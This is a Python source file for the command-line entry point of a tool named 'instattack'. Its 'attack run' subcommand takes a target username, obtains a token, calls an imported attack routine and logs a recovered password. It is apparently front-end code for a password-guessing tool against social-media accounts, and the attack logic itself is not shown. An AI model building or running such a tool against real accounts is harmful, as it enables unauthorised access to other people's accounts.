import asyncio

from instattack.core.attack import attack, get_token

from .base import EntryPoint, BaseApplication


@EntryPoint.subcommand('attack')
class BaseAttack(BaseApplication):

    async def attempt_attack(self, loop, token):
        return await attack(loop, token, self.user, self.config)

    def get_token(self, loop):
        # Token will be None if an exception occured.
        token = loop.run_until_complete(get_token(loop, self.config))
        if not token:
            self.log.error('Token retrieval failed.')
            return

        self.log.success('Received Token', extra={'other': token})
        return token


@BaseAttack.subcommand('run')
class AttackRun(BaseAttack):

    __name__ = 'Run Attack'

    def main(self, username):
        loop = asyncio.get_event_loop()

        user = loop.run_until_complete(self.get_user(username))
        if not user:
            return

        # Token will be None if an exception occured.
        token = self.get_token(loop)
        if not token:
            return

        result = loop.run_until_complete(self.attempt_attack(loop, token))
        if result:
            self.log.info(f'Authenticated User!', extra={
                'password': result.context.password
            })
